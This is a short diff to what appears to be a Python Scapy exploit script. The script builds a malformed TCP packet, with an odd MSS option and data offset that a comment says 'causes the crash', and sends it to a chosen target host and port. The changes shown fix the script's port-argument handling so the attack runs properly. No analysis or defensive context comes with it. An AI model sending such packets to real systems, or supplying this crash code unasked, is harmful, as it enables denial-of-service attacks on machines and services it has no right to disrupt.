@@ -29,7 +29,7 @@ def send_tcp_packet(srcip,dstip,dst_port):
 
     ip=IP(dst=dstip, ttl=4)
 
-    tcp1=TCP(dport=dstport)
+    tcp1=TCP(dport=dst_port)
 
     tcp1.options= [('MSS', '\x41'), ('NOP', None), ('EOL', None)]
     tcp1.dataofs = 8 # <-- causes the crash
@@ -53,7 +53,7 @@ if __name__ == "__main__":
             if o == '-h': usage()
             elif o == '-s': srcip = a
             elif o == '-d': dstip = a
-            elif o == '-p': dstport = a
+            elif o == '-p': dstport = int(a)
             else: raise Warning, 'EDOOFUS - Programming error'
     except getopt.GetoptError, e:
         usage(e)
